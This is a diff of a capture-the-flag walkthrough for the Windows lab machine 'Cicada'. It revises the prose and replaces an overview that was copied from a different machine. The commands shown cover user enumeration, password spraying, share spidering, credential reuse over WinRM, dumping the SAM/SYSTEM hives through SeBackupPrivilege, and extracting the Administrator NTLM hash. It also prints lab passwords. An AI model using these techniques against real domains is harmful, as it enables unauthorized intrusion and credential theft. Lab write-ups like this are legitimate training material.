@@ -15,7 +15,7 @@ tools_used: [nmap]
 
 ## Overview
 
-`EscapeTwo` is an easy difficulty Windows machine designed around a complete domain compromise scenario, where credentials for a low-privileged user are provided. We leverage these credentials to access a file share containing a corrupted Excel document. By modifying its byte structure, we extract credentials. These are then sprayed across the domain, revealing valid credentials for a user with access to `MSSQL`, granting us initial access. System enumeration reveals `SQL` credentials, which are sprayed to obtain `WinRM` access. Further domain analysis shows the user has write owner rights over an account managing `ADCS`. This is used to enumerate `ADCS`, revealing a misconfiguration in Active Directory Certificate Services. Exploiting this misconfiguration allows us to retrieve the `Administrator` account hash, ultimately leading to complete domain compromise. 
+Cicada is an easy-difficult Windows machine that focuses on beginner Active Directory enumeration and exploitation. In this machine, players will enumerate the domain, identify users, navigate shares, uncover plaintext passwords stored in files, execute a password spray, and use the `SeBackupPrivilege` to achieve full system compromise. 
 
 ```mermaid
 flowchart TD
@@ -140,7 +140,7 @@ nxc smb 'CICADA-DC' -u 'guest' -p '' --rid-brute | awk '{print $6}' | cut -d '\'
 
 ### Password Spraying Attack
 
-Password spraying the discovered default password against enumerated potential users revealed multiple valid accounts. :
+Password spraying the discovered default password against enumerated potential users revealed multiple valid accounts. `michael.wrightson` used the default password from the HR notice, and `david.orelious` left his password in his user description `aRt$Lp#7t*VQ!3` in case he forgot it:
 ```bash
 nxc ldap 'CICADA-DC' -u potential-users.txt -p creds.txt --active-users 
 
@@ -160,7 +160,7 @@ LDAP        10.10.11.35     389    CICADA-DC        emily.oscars                
 
 ### Complete User Enumeration
 
-Used valid credentials to obtain complete user listing:
+Used `michael.wrightson`'s credentials to further enumerate users of LDAP and get a more accurate user list:
 ```bash
 nxc ldap 'CICADA-DC' -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --active-users | awk '{print $5}' | grep -v '[\[*|-]' > users.txt
 
@@ -175,19 +175,19 @@ emily.oscars
 
 ### Share Spidering
 
-SMB share spidering with `david.orelious` credentials revealed additional resources:
+SMB share spidering with `david.orelious`' credentials revealed additional resources:
 ```bash
 nxc smb 'CICADA-DC' -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' -M spider_plus -o DOWNLOAD_FLAG=True 
 ```
 
-Copy the files from the newly discovered DEV share.
+I copied the files from the newly discovered "DEV" share.
 ```bash
 cp -r /home/wither/.nxc/modules/nxc_spider_plus/10.10.11.35/DEV/* .
 ```
 
 ### Credential Discovery
 
-Backup script contained hardcoded credentials for `emily.oscars`:
+A backup script in the "DEV" share `Backup_script.ps1` contained hardcoded credentials for `emily.oscars`:
 ```bash
 cat Backup_script.ps1                                              
 
@@ -206,14 +206,14 @@ Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath
 
 ### Initial Access
 
-WinRM access validated with `emily.oscars` credentials:
+I added the password to the list, and sprayed the users and passwords again for WinRM access. The newly acquired `emily.oscars`' credentials came back a hit.
 ```bash
 nxc winrm 'CICADA-DC' -u users.txt  -p creds.txt  -d 'cicada.local'                 
 ...
 WINRM       10.10.11.35     5985   CICADA-DC        [+] cicada.local\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)
 ```
 
-User flag was on her Desktop
+The user flag was on her Desktop.
 ```powershell
 *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> more ../Desktop/user.txt
 ```
@@ -224,7 +224,7 @@ User flag was on her Desktop
 
 ### Privilege Analysis
 
-`emily.oscars` account possessed `SeBackupPrivilege`, which enabled registry hive extraction:
+The `emily.oscars` account possessed `SeBackupPrivilege`, a dangerous permission allowing users to create backups of the system.
 ```powershell
 *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /priv
 
@@ -242,7 +242,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 
 ### Registry Hive Extraction
 
-`SeBackupPrivilege` allowed reading any file on the system, including protected registry hives containing password hashes:
+I used this permission to extract and download the `SAM` and `SYSTEM` registry hives to my machine.
 ```powershell
 *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> reg save hklm\sam sam
 The operation completed successfully.
@@ -264,7 +264,7 @@ Info: Download successful!
 
 ### Hash Extraction
 
-Registry hive analysis revealed Administrator NTLM hash:
+Then used `pypykatz` to extract the `Administrator` account's NTLM hash.
 ```bash
 pypykatz registry --sam sam system
 
